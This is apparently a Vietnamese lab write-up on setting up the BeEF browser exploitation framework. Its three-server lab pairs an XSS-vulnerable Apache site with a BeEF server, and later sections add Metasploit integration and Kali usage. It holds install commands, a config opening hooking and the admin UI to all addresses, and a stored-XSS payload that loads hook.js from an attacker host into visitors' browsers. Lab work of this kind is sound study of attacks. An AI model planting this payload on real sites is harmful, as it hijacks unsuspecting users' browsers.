BeEF Framework
Server A: bị ảnh hưởng bởi lỗ hổng Cross-site scripting (XSS) (sử dụng Apache và chạy trên EC2 AWS)
Server B: Sử dụng BeEF Framework đóng vai trò như một máy chủ khai thác (xây dựng trên GCP Cloud).
Client C: Đóng vai trò như một người dùng thông thường, truy cập vào Server A.
Xây dựng môi trường
Cài đặt Apache2
sudo apt-get update;sudo apt-get upgrade
sudo apt-get install -y apache2
<script>alert('Test Script')</script>
Cài đặt BeEF Framework (Server B)
Cài đặt Ruby
sudo apt-get install software-properties-common
sudo apt-get update
sudo apt-add-repository -y ppa:brightbox/ruby-ng
Cài đặt RVM
sudo apt-add-repository -y ppa:rael-gc/rvm
sudo apt-get update;sudo apt-get install rvm
rvm install "ruby-2.5.3"
echo 'source "/etc/profile.d/rvm.sh"' >> ~/.bashrc
 sudo add-apt-repository ppa:jonathonf/gcc-9.0
 sudo apt-get update
 sudo apt-get install gcc-9
 sudo apt-get install git curl wget -y
Download and running BeEF Framework
git clone https://github.com/beefproject/beef
cd beef
./install 
./beef 
 # Credentials to authenticate in BeEF.
    # Used by both the RESTful API and the Admin interface
    credentials:
        user:   "admin"
        passwd: "admin@123"
    # Interface / IP restrictions
    restrictions:
        # subnet of IP addresses that can hook to the framework
        permitted_hooking_subnet: ["0.0.0.0/0", "::/0"]
        # subnet of IP addresses that can connect to the admin UI
        #permitted_ui_subnet: ["127.0.0.1/32", "::1/128"]
        permitted_ui_subnet: ["0.0.0.0/0", "::/0"]
        # slow API calls to 1 every  api_attempt_delay  seconds
        api_attempt_delay: "0.05"
    # HTTP server
    http:
        debug: false #Thin::Logging.debug, very verbose. Prints also full exception stack trace.
        host: "0.0.0.0"
        port: "8080"
3. Proof of concept
Tạo mã độc hại bằng BeEF Framework.
BeEF Framework mặc được trang bị một đoạn mã Javascript vô cùng "xịn xò" mang tên hook.js .Bạn có thể tìm thấy nó tại http://you-ip/hook.js
Bước 2. Nhúng mã hook.js vào Server A
Payload: <script src=”http://your-ip/hook.js” type=”text/javascript”></script>
----------------------------------------
C2:
Cài đặt và cấu hình Browser Exploitation Framework
apt-get install beef-xss
1 ) Edit the main configuration file located at /usr/share/beef-xss/
config.yamlto read:
metasploit:
enable:true2.
2) Edit the file located at /usr/share/beef-xss/extensions/metasploit/
config.yml. You need to edit the lines host, callback_host, and os
'custom', pathto include your IP address and the location for the
Metasploit Framework A correctly edited config.ymlfile is shown in the following screenshot:
3) Start msfconsole, and load the msgrpcmodule, as shown in the following
screenshot. Make sure that you include the password as well:
4 ) Start BeEF using the following commands:
root@kali:~# cd /usr/share/beef-xss/
root@kali:/usr/share/beef-xss/~# ./beef
đi đến http://:3000/ui/panel
default login: User: beef, Password: beef
thay đổi cấu user và passwrod mặc định thì xem trong file config.yaml
-------------------------------------------------------------
C3:
Khởi động BeEF:
Cũng như các công cụ khác được giới thiệu trong series này, nó được tích hợp sẵn trên Kali Linux. Bạn có thể mở từ Menu, Application hay Terminal đều được.
Khởi động BeEF.
BeEF sẽ mở các service cần thiết và biến máy Kali thì một máy chủ web để chạy BeEF, vì nó được xây dựng theo dạng web application mà. Trên chính máy tính Kali của bạn, bạn có thể vào địa chỉ sau để vào bảng điều khiển BeEF Panel:
http://127.0.0.1:3000/ui/panel 
còn đối với một máy tính khác thì vào địa chỉ dạng:
http://<IP>:3000/ui/panel
Một cửa sổ yêu cầu đăng nhập, bạn đăng nhập bằng tên đăng nhập và mật khẩu mặc định là beef. Và bạn cũng có thể thay đổi trong file cấu hình /usr/share/beef-xss/config.yamlto.
Trang web Demo 1: http://<IP>:3000/demos/basic.html
Trang web Demo 2: http://<IP>:3000/demos/butcher/index.html


![305958612_831526307876618_9131065325802753900_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/3c1e29c4-1d23-4989-b37e-4fc6c0b71e46)
![306964053_831526154543300_3530839628808834855_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/8b5eb807-af77-4f88-9a56-2d3f1fa5af74)
![307382154_831526041209978_4068041025520495048_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/3ffcfc41-bbce-42f5-8cd6-81773cbf3588)
![306938180_831523944543521_2721496235238299375_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/541a186a-ce99-4cf1-9573-9e4099b58456)
![307317988_831523774543538_2085703357776021444_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/bef4bd12-b051-49e7-b825-cc3c72a0d4ff)
![306658765_831526441209938_6785713292026902660_n](https://github.com/NguyenNhutY/Computer_Networks/assets/130396826/c28853da-733b-41a9-bb9b-0f8ed5d61491)
